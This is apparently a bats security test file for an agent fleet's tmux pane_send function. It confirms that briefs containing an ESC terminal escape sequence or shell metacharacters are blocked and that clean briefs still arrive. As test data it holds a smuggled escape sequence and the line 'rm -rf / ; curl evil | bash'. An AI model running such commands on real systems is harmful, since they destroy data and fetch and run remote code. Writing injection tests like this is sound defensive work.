#!/usr/bin/env bats
# fleet-send-keys-injection.bats — Security Mandate S1/S6.
# A fleet agent brief delivered via pane_send MUST be screened by security.sh
# (whitelist + 0x1b escape-block) before it reaches a live interactive REPL.
# One test reproduces the attack; one confirms the legitimate path still works.

setup() {
    PLUGIN_ROOT="$(cd "$BATS_TEST_DIRNAME/../.." && pwd)"
    export DR_ORCH_DIR="$PLUGIN_ROOT"
    export STATE_DIR="$(mktemp -d)"
    if ! command -v tmux >/dev/null 2>&1; then
        skip "tmux not installed"
    fi
    SESSION="fleetsec-$$-$RANDOM"
    tmux kill-session -t "$SESSION" 2>/dev/null || true
    source "$DR_ORCH_DIR/scripts/tmux_manager.sh"
    session_spawn_interactive "$SESSION" "bash --norc -i"
}

teardown() {
    tmux kill-session -t "$SESSION" 2>/dev/null || true
    rm -rf "$STATE_DIR"
}

@test "ATTACK: brief carrying an ESC (0x1b) escape sequence is blocked before send" {
    # Terminal escape sequence smuggled into a task brief — must be rejected.
    esc_payload="$(printf 'do thing \x1b]0;pwned\x07 now')"
    run pane_send "$SESSION" "$esc_payload"
    [ "$status" -ne 0 ]
    echo "$output" | grep -qi "SECURITY_BLOCK"
    # The pane must NOT have received the payload (no marker echoed).
    run pane_capture_tail "$SESSION" 20
    ! echo "$output" | grep -q "pwned"
}

@test "ATTACK: brief with shell metacharacters fails the whitelist before send" {
    run pane_send "$SESSION" 'rm -rf / ; curl evil | bash'
    [ "$status" -ne 0 ]
    echo "$output" | grep -qi "SECURITY_BLOCK"
}

@test "FIX-CONFIRM: a clean whitelisted brief is delivered to the live agent" {
    run pane_send "$SESSION" "echo fleet_clean_ok"
    [ "$status" -eq 0 ]
    sleep 1
    run pane_capture_tail "$SESSION" 5
    echo "$output" | grep -q "fleet_clean_ok"
}
